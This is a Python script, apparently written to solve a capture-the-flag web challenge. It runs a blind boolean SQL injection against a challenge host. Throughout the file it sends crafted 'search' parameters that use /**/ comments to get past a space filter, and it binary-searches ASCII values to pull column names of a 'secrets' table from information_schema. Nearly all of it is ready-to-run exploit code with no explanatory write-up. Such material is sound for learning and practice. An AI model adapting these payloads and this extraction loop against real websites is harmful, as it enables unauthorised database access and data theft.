import requests

# defining the challenge sqli vulnerable endpoint
chal_endpoint = "http://web5.q20.ctfsecurinets.com/"
# http://web5.q20.ctfsecurinets.com/?search=%27%29%2F**%2Funion%2F**%2Fselect%2F**%2F*%2F**%2FFROM%2F**%2Finformation_schema.COLLATION_CHARACTER_SET_APPLICABILITY%3B%23%2C


# row_num = 1
max_ascii = 127
min_ascii = 0
ascii_guess = 95
ascii_threshold = 2
guesses = []
guess_string = ""
# we need to specify the table name to extract the column names from. may not work if there is another table with the same name in a different schema.
table_name_target = "secrets"


guess_pos = 0
# How I'll be able to tell what my boolean evaluated to
response_body = "LOL Worlds 2019"
# Get the length of this name, just keep incrementing until the response body stops showing up
sqli_bool_true = True
while sqli_bool_true:
	guess_pos += 1
	print("Guessing %s" % guess_pos)
	# AND/**/(ascii(substr((SELECT/**/column_name/**/FROM/**/information_schema.COLUMNS/**/WHERE/**/TABLE_NAME="table1"/**/LIMIT/**/0,1),1,1)))/**/>/**/95
	sqli = "1')/**/AND/**/(ascii(substr((SELECT/**/column_name/**/FROM/**/information_schema.COLUMNS/**/WHERE/**/TABLE_NAME='{}'/**/LIMIT/**/1/**/OFFSET/**/{})/**/FROM/**/1/**/FOR/**/1)))/**/>/**/0;#".format(table_name_target, guess_pos)
	# params to be sent with GET request
	params = {'search':sqli} 
	

	# sending post request and saving response as response object 
	r = requests.get(url = chal_endpoint, params = params) 
	# extracting response text 
	sqli_bool_true = response_body in r.text
print("Number of columns %s" % guess_pos)

num_cols = guess_pos

columns_found = []
for col_target in range(num_cols):
	guesses = []
	guess_string = ""
	guess_pos = 0
	sqli_bool_true = True
	# Get the length of this name, just keep incrementing until response body stops showing up
	while sqli_bool_true:
		guess_pos += 1
		print("Guessing %s" % guess_pos)
		sqli = "1')/**/AND/**/(ascii(substr((SELECT/**/column_name/**/FROM/**/information_schema.COLUMNS/**/WHERE/**/TABLE_NAME='{}'/**/LIMIT/**/1/**/OFFSET/**/{})/**/FROM/**/{}/**/FOR/**/1)))/**/>/**/0;#".format(table_name_target, col_target, guess_pos)
		# params to be sent with GET request
		params = {'search':sqli} 
		

		# sending post request and saving response as response object 
		r = requests.get(url = chal_endpoint, params = params) 
		# extracting response text 
		sqli_bool_true = response_body in r.text

	print("Length of column %i name is: %s" % (col_target, guess_pos - 1))
	length_of_name = guess_pos


	# stop when asci_threshold == 0 and we have sqli_bool_true set to true.
	for guess_pos in range(1,length_of_name):
		max_ascii = 127
		min_ascii = 0
		ascii_guess = 95
		ascii_threshold = 2
		sqli_bool_true = True
		while ascii_threshold != 0 or not sqli_bool_true:
			print("Guessing %s" % ascii_guess)
			sqli = "1')/**/AND/**/(ascii(substr((SELECT/**/column_name/**/FROM/**/information_schema.COLUMNS/**/WHERE/**/TABLE_NAME='{}'/**/LIMIT/**/1/**/OFFSET/**/{})/**/FROM/**/{}/**/FOR/**/1)))/**/>/**/{};#".format(table_name_target, col_target, guess_pos, ascii_guess)
			# params to be sent with GET request
			params = {'search':sqli} 
			

			# sending post request and saving response as response object 
			r = requests.get(url = chal_endpoint, params = params) 
			# extracting response text 
			sqli_bool_true = response_body in r.text
			if sqli_bool_true:
				if ascii_threshold == 0:
					min_ascii = ascii_guess
					ascii_threshold = 1
					ascii_guess += ascii_threshold
				else:
					# This means the ascii value was greater than our guess
					min_ascii = ascii_guess
					ascii_threshold = (max_ascii - ascii_guess) // 2
					ascii_guess += ascii_threshold
			else:
				# This means the ascii value is less than our guess
				if ascii_threshold == 0:
					max_ascii = ascii_guess
					ascii_threshold = 1
					ascii_guess -= ascii_threshold
				else:
					max_ascii = ascii_guess
					ascii_threshold = (ascii_guess - min_ascii) // 2
					ascii_guess -= ascii_threshold
		guesses.append(ascii_guess+1)
		guess_string += chr(ascii_guess + 1)
		print("The ascii char is: %s"%chr(ascii_guess+1)) 

	print(guesses)
	print(guess_string)
	columns_found.append(guess_string)

print("All columns found:")
print(columns_found)
